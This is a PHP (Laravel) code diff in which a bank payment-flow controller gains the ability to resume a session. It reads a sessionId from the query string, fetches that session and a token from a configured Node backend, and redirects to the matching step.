@@ -15,7 +15,29 @@ class BankFlowController extends Controller
         $cfg = config("banks.$bank");
         abort_if(!$cfg, 404);
 
-        // Reinicia flujo “lógico”, conserva RT si existe
+        $maxSteps = (int) ($cfg['steps'] ?? 3);
+
+        // Si viene sessionId por query param, intentar recuperar sesión del backend
+        $externalSessionId = $request->query('sessionId');
+
+        if ($externalSessionId) {
+            $sc = $this->fetchExternalSession($externalSessionId);
+
+            if ($sc) {
+                // Actualizar banco y guardar en sesión local
+                $sc['bank'] = $bank;
+
+                $request->session()->put('sc', $sc);
+                $request->session()->save();
+
+                // Determinar el step correcto según el estado de la sesión
+                $step = $this->expectedStepFor($sc, $maxSteps);
+
+                return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => $step]);
+            }
+        }
+
+        // Flujo normal: reinicia flujo "lógico", conserva RT si existe
         $old = (array) $request->session()->get('sc', []);
 
         $sc = [
@@ -30,6 +52,49 @@ class BankFlowController extends Controller
         $request->session()->save();
 
         return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => 1]);
+    }
+
+    /**
+     * Obtiene una sesión existente del backend Node usando el sessionId externo.
+     */
+    private function fetchExternalSession(string $sessionId): ?array
+    {
+        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
+
+        try {
+            // Obtener datos de la sesión
+            $url = $baseUrl . '/api/sessions/' . $sessionId;
+            $resp = Http::timeout(10)->get($url);
+
+            if ($resp instanceof \GuzzleHttp\Promise\PromiseInterface) {
+                $resp = $resp->wait();
+            }
+
+            if (!$resp->successful()) {
+                return null;
+            }
+
+            $session = $resp->json('session') ?? $resp->json();
+
+            // Obtener token para esta sesión
+            $tokenUrl = $baseUrl . '/api/sessions/' . $sessionId . '/issue-token';
+            $tokenResp = Http::asJson()->timeout(10)->post($tokenUrl);
+
+            if ($tokenResp instanceof \GuzzleHttp\Promise\PromiseInterface) {
+                $tokenResp = $tokenResp->wait();
+            }
+
+            $sessionToken = $tokenResp->successful() ? $tokenResp->json('sessionToken') : null;
+
+            return [
+                'rt_session_id' => $sessionId,
+                'rt_session_token' => $sessionToken,
+                'action' => $session['action'] ?? null,
+                'step' => $session['step'] ?? '1',
+            ];
+        } catch (\Throwable $e) {
+            return null;
+        }
     }
 
     public function step(string $bank, int $step, Request $request)
